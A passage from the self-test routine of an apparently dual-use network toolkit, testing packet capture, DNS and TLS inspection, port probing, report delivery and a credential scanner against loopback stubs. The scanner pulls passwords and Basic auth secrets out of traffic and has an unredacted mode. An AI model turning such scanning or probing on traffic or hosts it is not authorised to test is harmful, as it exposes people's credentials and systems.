                   % (stub_port, len(reply_seen), (seen_questions or ["?"])[0]))
        except (AssertionError, FrameworkError) as exc:
            record("module 15: DNS resolver round-trip", "fail", "assertion: %s" % exc)
        except Exception as exc:
            record("module 15: DNS resolver round-trip", "fail", "%s: %s" % (type(exc).__name__, exc))
        finally:
            for held in (stub_sock, source_sock):
                if held is not None:
                    try:
                        held.close()
                    except OSError:
                        pass
    else:
        record("module 15: DNS resolver round-trip", "skip",
               "requires root/CAP_NET_RAW and scapy DNS layers (or --no-live requested)")

    # 21. wireless lab capability detection
    try:
        interfaces = wireless_capability_report()
        assert isinstance(interfaces, list), "wireless capability report did not return a list"
        for entry in interfaces:
            assert "interface" in entry and "type" in entry, "malformed wireless entry: %s" % entry
        iw_present = bool(shutil.which("iw"))
        record("module 16: wireless capability report", "pass",
               "%d wireless interface(s); iw=%s; 802.11 scapy layers=%s"
               % (len(interfaces), "present" if iw_present else "absent",
                  "available" if WIRELESS_LAYERS_AVAILABLE else "unavailable"))
    except (AssertionError, FrameworkError) as exc:
        record("module 16: wireless capability report", "fail", "assertion: %s" % exc)
    except Exception as exc:
        record("module 16: wireless capability report", "fail", "%s: %s" % (type(exc).__name__, exc))

    # 22. credential pattern engine + masking policy
    try:
        form_payload = b"username=alice&password=Sup3rSecret!&submit=Login"
        findings = scan_for_credentials(form_payload)
        assert findings, "credential scanner found nothing in an obvious form POST"
        kinds = {entry["kind"] for entry in findings}
        assert any(kind.startswith("form/url password") for kind in kinds), "password rule did not fire"
        assert any(kind.startswith("form/url username") for kind in kinds), "username rule did not fire"
        for entry in findings:
            assert "Sup3rSecret!" not in entry["preview"], "secret leaked in full: %s" % entry["preview"]
        basic_payload = b"Authorization: Basic dXNlcjpwYXNzd29yZA=="
        basic_findings = scan_for_credentials(basic_payload)
        assert any(entry["kind"] == "http basic auth" for entry in basic_findings), \
            "HTTP basic auth rule did not fire"
        decoded = next(entry for entry in basic_findings if entry["kind"] == "http basic auth")
        assert "decoded" in decoded and "user" not in decoded["decoded"].split(":")[0].replace("*", ""), \
            "basic-auth decode should be masked"
        assert mask_secret("abcdef", keep=1) == "a*****"
        assert mask_secret("a") == "*"
        raw_findings = scan_for_credentials(form_payload, redact=False)
        assert any("Sup3rSecret!" in entry["preview"] for entry in raw_findings), \
            "explicit unredacted mode did not preserve the value"
        assert CRED_PATTERNS and len(CRED_PATTERNS) >= 10, "pattern catalogue is short: %d" % len(CRED_PATTERNS)
        record("module 17: credential detection & masking", "pass",
               "%d pattern families; masked previews verified (raw mode opt-in)" % len(CRED_PATTERNS))
    except (AssertionError, FrameworkError) as exc:
        record("module 17: credential detection & masking", "fail", "assertion: %s" % exc)
    except Exception as exc:
        record("module 17: credential detection & masking", "fail", "%s: %s" % (type(exc).__name__, exc))

    # 23. reporting exports (HTML + Markdown)
    try:
        html_path = generate_html_report()
        md_path = export_markdown_summary()
        assert os.path.exists(html_path) and os.path.getsize(html_path) > 2000, \
            "HTML report suspiciously small: %s" % html_path
        with open(html_path, "r", encoding="utf-8") as handle:
            html_body = handle.read()
        assert LOGGER.session_id in html_body, "session id missing from the HTML report"
        assert "<table" in html_body and "Audit trail" in html_body
        assert os.path.exists(md_path) and os.path.getsize(md_path) > 200, \
            "Markdown summary suspiciously small: %s" % md_path
        with open(md_path, "r", encoding="utf-8") as handle:
            md_body = handle.read()
        assert LOGGER.session_id in md_body and "PrismStrike session summary" in md_body
        record("module 18: report exports (HTML/Markdown)", "pass",
               "%s (%s) + %s (%s)" % (os.path.basename(html_path), format_bytes(os.path.getsize(html_path)),
                                      os.path.basename(md_path), format_bytes(os.path.getsize(md_path))))
    except (AssertionError, FrameworkError, OSError) as exc:
        record("module 18: report exports (HTML/Markdown)", "fail",
               "%s: %s" % (type(exc).__name__, exc))

    # 24. session maintenance: prune dry-run must never delete
    try:
        before = 0
        try:
            before = len(os.listdir(LOGGER.log_dir))
        except OSError:
            before = 0
        plan = prune_sessions(keep_last=1, older_than_days=0.0, dry_run=True)
        after = len(os.listdir(LOGGER.log_dir))
        assert plan["dry_run"] is True, "dry-run flag lost"
        assert plan["removed"] == 0, "dry-run removed %d file(s)" % plan["removed"]
        assert after == before, "dry-run changed the log directory (%d -> %d entries)" % (before, after)
        assert "sessions" in plan and isinstance(plan["sessions"], int)
        record("module 18: session prune dry-run safety", "pass",
               "%d session(s) discovered, 0 files touched, 0 deletions" % plan["sessions"])
    except (AssertionError, FrameworkError, OSError) as exc:
        record("module 18: session prune dry-run safety", "fail", "assertion: %s" % exc)
    except Exception as exc:
        record("module 18: session prune dry-run safety", "fail", "%s: %s" % (type(exc).__name__, exc))

    # 25. throughput sampler + socket-to-process map
    try:
        backend_name, backend_note = _counter_backend(iface="lo")
        if backend_name in ("none", "scapy"):
            record("module 18: throughput sampler", "skip", backend_note)
        else:
            sample = throughput_sampler(iface="lo", duration=1.2, interval=0.4)
            assert sample.get("available"), "no backend used after a positive probe"
            assert sample["backend"] == backend_name, "backend changed between probe and sample"
            assert sample["samples"], "throughput sampler produced no samples"
            assert "lo" in sample["averages"], "loopback missing from the averages table"
            record("module 18: throughput sampler", "pass",
                   "%d samples over %s via %s; avg rx=%s/s tx=%s/s"
                   % (len(sample["samples"]), format_duration(1.2), sample["backend"],
                      format_bytes(sample["averages"]["lo"]["avg_rx_bytes_per_sec"]),
                      format_bytes(sample["averages"]["lo"]["avg_tx_bytes_per_sec"])))
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            listener.bind(("127.0.0.1", 0))
            listener.listen(4)
            listen_port = int(listener.getsockname()[1])
            rows = socket_process_map()
            assert rows, "socket map returned no rows"
            mine = [row for row in rows if row["local_port"] == listen_port]
            assert mine, "our own listening socket (%d) was not enumerated" % listen_port
            assert any(row["pid"] == os.getpid() for row in mine), \
                "socket %d was not attributed to this process" % listen_port
            record("module 18: socket -> process map", "pass",
                   "%d socket(s) enumerated; own listener on :%d attributed to pid %d"
                   % (len(rows), listen_port, os.getpid()))
        finally:
            try:
                listener.close()
            except OSError:
                pass
    except (AssertionError, FrameworkError) as exc:
        record("module 18: sampler & socket map", "fail", "assertion: %s" % exc)
    except Exception as exc:
        record("module 18: sampler & socket map", "fail", "%s: %s" % (type(exc).__name__, exc))

    # 26. extension wiring: menus, handlers and CLI surface
    try:
        new_modules = [module_network_utils, module_dhcp, module_dns, module_wireless,
                       module_listeners, module_extras]
        for module_callable in new_modules:
            assert callable(module_callable), "%s is not callable" % module_callable
        assert len(MAIN_MENU_TABLE) == 19, "expected 18 modules + exit, found %d entries" % len(MAIN_MENU_TABLE)
        assert MAIN_MENU_TABLE["0"][1] is None, "exit entry must map to None"
        assert MAIN_MENU_TABLE[str(SELF_TEST_MENU_KEY)][1] == "self-test"
        for key in ("13", "14", "15", "16", "17", "18"):
            assert key in MAIN_MENU_TABLE, "extension menu entry %s missing" % key
        assert len(MENU_GROUPS) == 4, "expected four menu groups, found %d" % len(MENU_GROUPS)
        parser = build_argument_parser()
        option_strings = {option for action in parser._actions for option in action.option_strings}
        for flag in ("--module", "--self-test", "--report", "--log-dir", "--no-color"):
            assert flag in option_strings, "CLI flag %s missing" % flag
        module_choices = next(action.choices for action in parser._actions
                              if "--module" in action.option_strings)
        for slug in ("utils", "dhcp", "dns", "wlan", "listeners", "extras", "report"):
            assert slug in module_choices, "module slug '%s' missing from --module" % slug
        record("extension wiring (menus/CLI)", "pass",
               "6 new modules, %d menu entries, %d menu groups, CLI slugs verified"
               % (len(MAIN_MENU_TABLE), len(MENU_GROUPS)))
    except (AssertionError, FrameworkError, Exception) as exc:
        record("extension wiring (menus/CLI)", "fail", "assertion: %s" % exc)

    # =====================================================================
    # ONLINE BATTERY - v3.1 networked paths, exercised against loopback stubs
    # =====================================================================
    out("")
    out(c("  online battery (v%s - live/remote/delivery paths)" % __version__, "bmagenta", "bold"))

    # 27. online capture -> immediate analysis (live loopback, bounded)
    if include_live and SCAPY_AVAILABLE and Privileges.raw_socket_available():
        try:
            def _online_inject() -> None:
                time.sleep(0.5)
                for attempt in range(6):
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        sock.settimeout(1.0)
                        sock.sendto(b"PrismStrike-ONLINE-%d" % attempt, ("127.0.0.1", 47893))
                        sock.close()
                    except OSError:
                        return
                    time.sleep(0.35)

            injector = threading.Thread(target=_online_inject, daemon=True)
            injector.start()
            capture = online_capture_analyse(iface="lo", duration=3.0,
                                             bpf="udp and host 127.0.0.1", max_packets=5000,
                                             save_pcap=True)
            injector.join(timeout=3)
            assert capture["packets"] >= 1, "live capture recorded no packets"
            assert capture["pcap_path"] and os.path.exists(capture["pcap_path"]), "capture not persisted"
            assert capture["analysis"].get("packets_in_file", 0) >= 1, \
                "offline analyst reported no packets for the live capture"
            record("online: live capture -> analysis", "pass",
                   "%d packet(s) captured on lo and re-analysed from %s"
                   % (capture["packets"], os.path.basename(capture["pcap_path"])))
        except (AssertionError, FrameworkError) as exc:
            record("online: live capture -> analysis", "fail", "assertion: %s" % exc)
        except Exception as exc:
            record("online: live capture -> analysis", "fail", "%s: %s" % (type(exc).__name__, exc))
    else:
        record("online: live capture -> analysis", "skip",
               "requires root/CAP_NET_RAW or --no-live was requested")

    # 28. remote capture ingest over HTTP (stub server serves a real pcap)
    if include_live and SCAPY_AVAILABLE:
        stub_server = None
        try:
            seed_path = os.path.join(LOGGER.artifact_dir,
                                     "%s_ondemand_%s.pcap" % (LOGGER.session_id, uuid.uuid4().hex[:6]))
            wrpcap(seed_path, [Ether() / PacketBuilder.tcp("203.0.113.5", 443, flags="S"),
                               PacketBuilder.udp("203.0.113.6", 53, payload=b"dns"),
                               PacketBuilder.arp_request("203.0.113.7")])
            with open(seed_path, "rb") as handle:
                pcap_bytes = handle.read()

            def _responder(method: str, path: str, headers: Dict[str, Any], body: bytes):
                if path.endswith(".pcap"):
                    return 200, "application/vnd.tcpdump.pcap", pcap_bytes
                return 200, "text/plain; charset=utf-8", b"this is not a capture file"

            stub_server = LoopbackHTTPServer(_responder).start()
            fetched = fetch_remote_capture("%s/evidence.pcap" % stub_server.url_base, timeout=10.0)
            assert fetched["status"] == 200, "unexpected HTTP status %s" % fetched["status"]
            assert fetched["bytes"] == len(pcap_bytes), \
                "byte count mismatch (%s vs %s)" % (fetched["bytes"], len(pcap_bytes))
            assert fetched["analysis"].get("packets_in_file") == 3, "remote capture analysis was wrong"
            rejected = False
            try:
                fetch_remote_capture("%s/raw-text" % stub_server.url_base, timeout=10.0)
            except FrameworkError:
                rejected = True
            assert rejected, "a non-capture payload was accepted as a capture file"
            record("online: remote capture ingest (HTTP)", "pass",
                   "%s fetched from an HTTP stub, magic validated, non-capture payload rejected"
                   % format_bytes(fetched["bytes"]))
        except (AssertionError, FrameworkError) as exc:
            record("online: remote capture ingest (HTTP)", "fail", "assertion: %s" % exc)
        except Exception as exc:
            record("online: remote capture ingest (HTTP)", "fail", "%s: %s" % (type(exc).__name__, exc))
        finally:
            if stub_server is not None:
                stub_server.stop()
    else:
        record("online: remote capture ingest (HTTP)", "skip", "scapy/live network unavailable")

    # 29. rolling stream analysis (live loopback with interval telemetry)
    if include_live and SCAPY_AVAILABLE and Privileges.raw_socket_available():
        try:
            def _stream_inject() -> None:
                time.sleep(0.3)
                for attempt in range(12):
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        sock.settimeout(1.0)
                        sock.sendto(b"STREAM-%02d" % attempt, ("127.0.0.1", 47894))
                        sock.close()
                    except OSError:
                        return
                    time.sleep(0.2)

            injector = threading.Thread(target=_stream_inject, daemon=True)
            injector.start()
            stream = stream_analyse(iface="lo", duration=3.0, bpf="udp and host 127.0.0.1",
                                    interval=0.75)
            injector.join(timeout=3)
            assert stream["totals"]["packets"] >= 1, "stream analyser saw no packets"
            assert len(stream["intervals"]) >= 2, \
                "expected rolling telemetry intervals, got %d" % len(stream["intervals"])
            assert stream["totals"]["protocols"].get("UDP", 0) >= 1, "UDP traffic was not classified"
            record("online: rolling stream analysis", "pass",
                   "%d packet(s), %d interval report(s), protocols classified live"
                   % (stream["totals"]["packets"], len(stream["intervals"])))
        except (AssertionError, FrameworkError) as exc:
            record("online: rolling stream analysis", "fail", "assertion: %s" % exc)
        except Exception as exc:
            record("online: rolling stream analysis", "fail", "%s: %s" % (type(exc).__name__, exc))
    else:
        record("online: rolling stream analysis", "skip",
               "requires root/CAP_NET_RAW or --no-live was requested")

    # 30. remote syslog shipping (UDP collector stub + session pipeline)
    try:
        collector = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        collector.bind(("127.0.0.1", 0))
        collector_port = int(collector.getsockname()[1])
        collector.settimeout(4.0)
        shipper = RemoteLogShipper(host="127.0.0.1", port=collector_port, protocol="udp",
                                   facility="local0")
        probe = shipper.test()
        assert probe["ok"] is True, "syslog probe reported failure: %s" % probe["error"]
        datagram, _ = collector.recvfrom(4096)
        assert datagram.startswith(b"<134>"), "unexpected syslog priority: %r" % datagram[:12]
        assert probe["marker"].encode() in datagram, "probe marker missing from the datagram"
        pipeline_marker = "syslog-pipeline-%s" % uuid.uuid4().hex[:8]
        shipper.start()
        LOGGER.attach_syslog(shipper)
        LOGGER.event("selftest", "syslog pipeline marker %s" % pipeline_marker)
        # The attach notice is shipped first, so drain the collector until the
        # marker datagram arrives (or the collector goes quiet).
        delivered = b""
        drain_deadline = time.time() + 5.0
        while time.time() < drain_deadline:
            try:
                datagram, _ = collector.recvfrom(4096)
            except socket.timeout:
                break
            if pipeline_marker.encode() in datagram:
                delivered = datagram
                break
        assert delivered, "live event did not reach the collector"
        LOGGER.attach_syslog(None)
        shipper.stop()
        collector.close()
        record("online: remote syslog shipping", "pass",
               "RFC5424 <134>1 line received by a UDP stub; live event pipeline verified")
    except (AssertionError, FrameworkError, OSError, socket.timeout) as exc:
        record("online: remote syslog shipping", "fail", "assertion: %s" % exc)
        try:
            LOGGER.attach_syslog(None)
        except Exception:
            pass
    except Exception as exc:
        record("online: remote syslog shipping", "fail", "%s: %s" % (type(exc).__name__, exc))
        try:
            LOGGER.attach_syslog(None)
        except Exception:
            pass

    # 31. webhook report delivery (HTTP stub captures the multipart body)
    if include_live:
        stub_server = None
        try:
            report_path = generate_html_report()
            received: List[int] = []

            def _hook_responder(method: str, path: str, headers: Dict[str, Any], body: bytes):
                received.append(len(body))
                if method != "POST":
                    return 405, "text/plain", b"POST only"
                return 200, "application/json", b'{"accepted": true}'

            stub_server = LoopbackHTTPServer(_hook_responder).start()
            pushed = push_report_webhook(report_path, "%s/intake" % stub_server.url_base,
                                         token="selftest-token",
                                         extra_fields={"session": LOGGER.session_id})
            assert pushed["delivered"] is True and pushed["status"] == 200, \
                "webhook not accepted: status=%s" % pushed["status"]
            assert received and received[0] > 1000, "webhook receiver got an empty body"
            auth = stub_server.requests[0]["headers"].get("Authorization", "")
            assert auth == "Bearer selftest-token", "bearer token not transmitted: %r" % auth
            content_type = stub_server.requests[0]["headers"].get("Content-Type", "")
            assert content_type.startswith("multipart/form-data; boundary="), \
                "wrong content type: %r" % content_type
            record("online: webhook report delivery", "pass",
                   "%s multipart body accepted by an HTTP stub (bearer auth verified)"
                   % format_bytes(received[0]))
        except (AssertionError, FrameworkError) as exc:
            record("online: webhook report delivery", "fail", "assertion: %s" % exc)
        except Exception as exc:
            record("online: webhook report delivery", "fail", "%s: %s" % (type(exc).__name__, exc))
        finally:
            if stub_server is not None:
                stub_server.stop()
    else:
        record("online: webhook report delivery", "skip", "--no-live-tests requested")

    # 32. SMTP summary delivery (stub SMTP server captures the message)
    if include_live:
        smtp_stub = None
        try:
            md_path = export_markdown_summary()
            smtp_stub = LoopbackSMTPServer().start()
            mail_marker = "PrismStrike selftest %s" % uuid.uuid4().hex[:8]
            sent = email_report_smtp(smtp_host="127.0.0.1", recipients=["ops@lab.test"],
                                     sender="prismstrike@lab.test", subject=mail_marker,
                                     body_text="self-test body", attachments=[md_path],
                                     port=smtp_stub.port, use_starttls=False, timeout=10.0)
            assert sent["dry_run"] is False, "delivery unexpectedly ran in dry-run mode"
            assert smtp_stub.messages, "stub SMTP server received no message"
            message = smtp_stub.messages[0].decode("utf-8", "replace")
            assert mail_marker in message, "subject missing from the transmitted message"
            assert "ops@lab.test" in message, "recipient header missing"
            assert os.path.basename(md_path) in message, "attachment filename missing"
            record("online: SMTP summary delivery", "pass",
                   "message with %s attachment accepted by a stub SMTP server"
                   % os.path.basename(md_path))
        except (AssertionError, FrameworkError) as exc:
            record("online: SMTP summary delivery", "fail", "assertion: %s" % exc)
        except Exception as exc:
            record("online: SMTP summary delivery", "fail", "%s: %s" % (type(exc).__name__, exc))
        finally:
            if smtp_stub is not None:
                smtp_stub.stop()
    else:
        record("online: SMTP summary delivery", "skip", "--no-live-tests requested")

    # 33. online dependency freshness (stub release API reports a newer version)
    if include_live:
        stub_server = None
        try:
            def _release_responder(method: str, path: str, headers: Dict[str, Any], body: bytes):
                if path.endswith("/json"):
                    return 200, "application/json", json.dumps(
                        {"info": {"name": "scapy", "version": "999.0.0"}}).encode("utf-8")
                return 404, "text/plain", b"not found"

            stub_server = LoopbackHTTPServer(_release_responder).start()
            freshness = online_dependency_check(packages=("scapy",),
                                                api_base=stub_server.url_base, timeout=5.0)
            assert freshness["reachable"] is True, "release API was reported unreachable"
            row = freshness["packages"][0]
            assert row["latest"] == "999.0.0", "latest version not parsed: %s" % row["latest"]
            assert row["status"] == "update available", "freshness verdict wrong: %s" % row["status"]
            record("online: dependency freshness check", "pass",
                   "installed scapy %s vs stub release %s -> '%s'"
                   % (row["installed"], row["latest"], row["status"]))
        except (AssertionError, FrameworkError) as exc:
            record("online: dependency freshness check", "fail", "assertion: %s" % exc)
        except Exception as exc:
            record("online: dependency freshness check", "fail", "%s: %s" % (type(exc).__name__, exc))
        finally:
            if stub_server is not None:
                stub_server.stop()
    else:
        record("online: dependency freshness check", "skip", "--no-live-tests requested")

    # 34. remote host dossier (loopback + our own listener as the "remote" host)
    try:
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind(("127.0.0.1", 0))
        listener.listen(4)
        dossier_port = int(listener.getsockname()[1])
        try:
            dossier = remote_host_dossier("127.0.0.1", ports=[dossier_port, 9], count=2, timeout=1.0)
        finally:
            try:
                listener.close()
            except OSError:
                pass
        assert dossier["resolved"] == "127.0.0.1", "resolution failed: %s" % dossier["resolved"]
        assert dossier_port in dossier["ports_open"], \
            "own listener was not detected as open (open=%s)" % dossier["ports_open"]
        closed_rows = [row for row in dossier["tcp"] if row["port"] == 9]
        assert closed_rows and closed_rows[0]["open"] is False, "port 9 misreported as open"
        assert dossier["icmp"]["sent"] == 0 or dossier["icmp"]["replies"] >= 1, \
            "ICMP probes were sent but never answered on loopback"
        record("online: remote host dossier", "pass",
               "127.0.0.1 dossier: rDNS=%s, %d open port(s), ICMP %d/%d"
               % (dossier["reverse_dns"] or "n/a", len(dossier["ports_open"]),
                  dossier["icmp"]["replies"], dossier["icmp"]["sent"]))
    except (AssertionError, FrameworkError) as exc:
        record("online: remote host dossier", "fail", "assertion: %s" % exc)
    except Exception as exc:
        record("online: remote host dossier", "fail", "%s: %s" % (type(exc).__name__, exc))

    # 35. online: RDAP ownership lookup (stub registry + failure path)
    if include_live:
        stub_server = None
        try:
            def _rdap_responder(method: str, path: str, headers: Dict[str, Any], body: bytes):
                if "example" in path and "ip/" not in path:
                    return 404, "application/json", b'{"errorCode": 404}'
                if path.rstrip("/").endswith("/404.example"):
                    return 404, "application/json", b'{"errorCode": 404}'
                payload = {
                    "objectClassName": "ip network",
                    "handle": "NET-203-0-113-0-1",
                    "name": "PrismStrike-TESTNET",
                    "type": "DIRECT ALLOCATION",
                    "country": "NL",
                    "startAddress": "203.0.113.0",
                    "endAddress": "203.0.113.255",
                    "status": ["active"],
                    "entities": [{
                        "handle": "ABUSE-TEST", "roles": ["abuse"],
                        "vcardArray": ["vcard", [["fn", {}, "text", "Test NOC"],
                                                 ["email", {}, "text", "abuse@testnet.example"]]],
                    }],
                    "events": [{"eventAction": "registration", "eventDate": "2019-04-02T00:00:00Z"}],
                    "remarks": [{"title": "Terms", "description": ["authorised testing only"]}],
                }
                return 200, "application/json", json.dumps(payload).encode("utf-8")

            stub_server = LoopbackHTTPServer(_rdap_responder).start()
            rdap_record = rdap_lookup("203.0.113.9", bootstrap=stub_server.url_base, timeout=5.0)
            assert rdap_record["handle"] == "NET-203-0-113-0-1", "handle not parsed"
            assert rdap_record["name"] == "PrismStrike-TESTNET", "name not parsed"
            assert rdap_record["country"] == "NL", "country not parsed"
            assert rdap_record["start_address"] == "203.0.113.0", "range not parsed"
            assert rdap_record["abuse_contacts"] == ["abuse@testnet.example"], \
                "abuse contact not parsed: %s" % rdap_record["abuse_contacts"]
            assert str(rdap_record["events"].get("registration", "")).startswith("2019-04-02"), \
                "registration event not parsed"
            failed_cleanly = False
            try:
                rdap_lookup("404.example", bootstrap=stub_server.url_base, timeout=5.0)
            except FrameworkError:
                failed_cleanly = True
            assert failed_cleanly, "an RDAP 404 did not raise FrameworkError"
            record("online: RDAP ownership lookup", "pass",
                   "stub registry parsed (handle, range, abuse contact, events); 404 rejected cleanly")
        except (AssertionError, FrameworkError) as exc:
            record("online: RDAP ownership lookup", "fail", "assertion: %s" % exc)
        except Exception as exc:
            record("online: RDAP ownership lookup", "fail", "%s: %s" % (type(exc).__name__, exc))
        finally:
            if stub_server is not None:
                stub_server.stop()
    else:
        record("online: RDAP ownership lookup", "skip", "--no-live-tests requested")

    # 36. online: DNS over HTTPS resolver (RFC 8484 JSON)
    if include_live:
        stub_server = None
        try:
            def _doh_responder(method: str, path: str, headers: Dict[str, Any], body: bytes):
                if "nx.prismstrike.invalid" in path:
                    payload = {"Status": 3, "Question": [{"name": "nx.prismstrike.invalid.", "type": 1}],
                               "Answer": []}
                else:
                    payload = {
                        "Status": 0, "AD": True,
                        "Question": [{"name": "portal.prismstrike.invalid.", "type": 1}],
                        "Answer": [{"name": "portal.prismstrike.invalid.", "type": 1, "TTL": 60,
                                    "data": "203.0.113.53"}],
                    }
                return 200, "application/dns-json", json.dumps(payload).encode("utf-8")

            stub_server = LoopbackHTTPServer(_doh_responder).start()
            answer = doh_query("portal.prismstrike.invalid", "A", resolver=stub_server.url_base,
                               timeout=5.0)
            assert answer["rcode"] == 0, "unexpected status %s" % answer["rcode"]
            assert answer["answered"] is True, "answer section not parsed"
            assert answer["answers"][0]["data"] == "203.0.113.53", "answer data mismatch"
            assert answer["answers"][0]["type"] == "A", "record type not mapped"
            missing = doh_query("nx.prismstrike.invalid", "A", resolver=stub_server.url_base, timeout=5.0)
            assert missing["answered"] is False, "NXDOMAIN must not report an answer"
            assert missing["rcode"] == 3, "NXDOMAIN status wrong: %s" % missing["rcode"]
            record("online: DoH resolver (RFC 8484 JSON)", "pass",
                   "A record resolved through a JSON DoH stub; NXDOMAIN reported honestly")
        except (AssertionError, FrameworkError) as exc:
            record("online: DoH resolver (RFC 8484 JSON)", "fail", "assertion: %s" % exc)
        except Exception as exc:
            record("online: DoH resolver (RFC 8484 JSON)", "fail", "%s: %s" % (type(exc).__name__, exc))
        finally:
            if stub_server is not None:
                stub_server.stop()
    else:
        record("online: DoH resolver (RFC 8484 JSON)", "skip", "--no-live-tests requested")

    # 37. online: DNSBL reputation check (stub blocklist nameserver)
    if include_live and SCAPY_AVAILABLE and DNS_LAYERS_AVAILABLE and Privileges.raw_socket_available():
        stub_sock = None
        source_sock = None
        try:
            stub_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            stub_sock.bind(("127.0.0.1", 0))
            stub_port = int(stub_sock.getsockname()[1])
            stub_sock.settimeout(8.0)
            source_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            source_sock.bind(("127.0.0.1", 0))
            source_port = int(source_sock.getsockname()[1])

            def _blocklist_stub() -> None:
                for _ in range(2):
                    try:
                        data, peer = stub_sock.recvfrom(2048)
                        query = DNS(bytes(data))
                        qname = _dns_names_to_text(query.qd.qname)
                        if "listed" in qname:
                            reply = DNS(id=int(query.id), qr=1, aa=1, rd=1, ra=1, qd=query.qd,
                                        ancount=1,
                                        an=DNSRR(rrname=query.qd.qname, type="A", ttl=60,
                                                 rdata="127.0.0.2"))
                        else:
                            reply = DNS(id=int(query.id), qr=1, aa=1, rd=1, ra=1, rcode=3,
                                        qd=query.qd)
                        stub_sock.sendto(bytes(reply), peer)
                    except Exception:
                        continue

            threading.Thread(target=_blocklist_stub, daemon=True).start()
            reputation = dnsbl_check("203.0.113.77", zones=("listed.test", "clean.test"),
                                     timeout=5.0, server="127.0.0.1:%d" % stub_port,
                                     source_port=source_port)
            listed_rows = [row for row in reputation["results"] if row["listed"]]
            clean_rows = [row for row in reputation["results"] if not row["listed"]]
            assert len(listed_rows) == 1, "exactly one zone should report a listing (%s)" % reputation
            assert listed_rows[0]["code"] == "127.0.0.2", "listing code not parsed"
            assert "Spamhaus" in listed_rows[0]["detail"], "listing reason not classified"
            assert len(clean_rows) == 1 and clean_rows[0]["zone"] == "clean.test", "clean zone misreported"
            assert reputation["listed_in"] == ["listed.test"], "summary listing wrong"
            record("online: DNSBL reputation check", "pass",
                   "stub blocklist answered 127.0.0.2 (classified) while the clean zone returned NXDOMAIN")
        except (AssertionError, FrameworkError) as exc:
            record("online: DNSBL reputation check", "fail", "assertion: %s" % exc)
        except Exception as exc:
            record("online: DNSBL reputation check", "fail", "%s: %s" % (type(exc).__name__, exc))
        finally:
            for held in (stub_sock, source_sock):
                if held is not None:
                    try:
                        held.close()
                    except OSError:
                        pass
    else:
        record("online: DNSBL reputation check", "skip",
               "requires root/CAP_NET_RAW, scapy DNS layers and --no-live-tests not set")

    # 38. online: MAC vendor resolution (online OUI API + local fallback)
    if include_live:
        stub_server = None
        try:
            def _vendor_responder(method: str, path: str, headers: Dict[str, Any], body: bytes):
                return 200, "text/plain; charset=utf-8", b"Example Networks Inc"

            stub_server = LoopbackHTTPServer(_vendor_responder).start()
            vendor = mac_vendor_online("02:00:5e:10:00:01", api_base=stub_server.url_base,
                                       timeout=5.0)
            assert vendor["vendor"] == "Example Networks Inc", "vendor not parsed: %s" % vendor
            assert vendor["source"] == "online-api", "wrong source: %s" % vendor["source"]
            assert vendor["oui"] == "02005E", "OUI prefix wrong: %s" % vendor["oui"]
            fallback = mac_vendor_online("02:00:5e:10:00:01", api_base="http://127.0.0.1:9",
                                         timeout=1.0)
            assert fallback["vendor"], "local fallback produced no value"
            assert fallback["source"] in ("local-table", "online-api"), "unexpected fallback source"
            record("online: MAC vendor resolution", "pass",
                   "OUI resolved through the online API stub; unreachable endpoint degraded without raising")
        except (AssertionError, FrameworkError) as exc:
            record("online: MAC vendor resolution", "fail", "assertion: %s" % exc)
        except Exception as exc:
            record("online: MAC vendor resolution", "fail", "%s: %s" % (type(exc).__name__, exc))
        finally:
            if stub_server is not None:
                stub_server.stop()
    else:
        record("online: MAC vendor resolution", "skip", "--no-live-tests requested")

    # 39. online: TLS certificate + cipher inspection (self-signed loopback service)
    if include_live and shutil.which("openssl"):
        tls_context = None
        server_sock = None
        stop_flag = threading.Event()
        try:
            cert_dir = os.path.join(LOGGER.artifact_dir, "tls_selftest")
            os.makedirs(cert_dir, exist_ok=True)
            cert_path = os.path.join(cert_dir, "cert.pem")
            key_path = os.path.join(cert_dir, "key.pem")
            try:
                subprocess.run(
                    ["openssl", "req", "-x509", "-newkey", "rsa:2048", "-keyout", key_path,
                     "-out", cert_path, "-days", "30", "-nodes", "-subj", "/CN=prismstrike-selftest.local",
                     "-addext", "subjectAltName=DNS:prismstrike-selftest.local,IP:127.0.0.1"],
                    check=True, capture_output=True, timeout=120)
            except subprocess.CalledProcessError as exc:
                raise FrameworkError("openssl refused to generate the test certificate: %s"
                                     % (exc.stderr or b"").decode("utf-8", "replace").strip()[:200])
            except subprocess.TimeoutExpired:
                raise FrameworkError("openssl certificate generation timed out after 120s")
            for artefact_path, artefact_label in ((cert_path, "certificate"), (key_path, "key")):
                try:
                    artefact_size = os.path.getsize(artefact_path)
                except OSError:
                    artefact_size = 0
                if artefact_size <= 0:
                    raise FrameworkError("openssl produced an empty %s at %s"
                                         % (artefact_label, artefact_path))
            tls_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            try:
                tls_context.load_cert_chain(cert_path, key_path)
            except (ssl.SSLError, OSError) as exc:
                raise FrameworkError("the generated certificate/key pair did not load: %s" % exc)
            server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server_sock.bind(("127.0.0.1", 0))
            server_sock.listen(4)
            tls_port = int(server_sock.getsockname()[1])

            def _tls_server() -> None:
                while not stop_flag.is_set():
                    try:
                        server_sock.settimeout(1.0)
                        connection, _ = server_sock.accept()
                    except (socket.timeout, OSError):
                        continue
                    try:
                        with tls_context.wrap_socket(connection, server_side=True) as tls_connection:
                            tls_connection.sendall(b"PrismStrike-TLS-STUB\n")
                    except (ssl.SSLError, OSError):
                        continue

            threading.Thread(target=_tls_server, daemon=True).start()
            inspected = tls_inspect("127.0.0.1", tls_port, timeout=6.0)
            assert "prismstrike-selftest.local" in inspected["subject"], \
                "subject CN not parsed: %s" % inspected["subject"]
            assert inspected["sha256_fingerprint"], "no certificate fingerprint computed"
            assert inspected["days_remaining"] is not None and inspected["days_remaining"] > 20, \
                "validity window wrong: %s" % inspected["days_remaining"]
            assert inspected["negotiated"]["version"], "TLS version not negotiated"
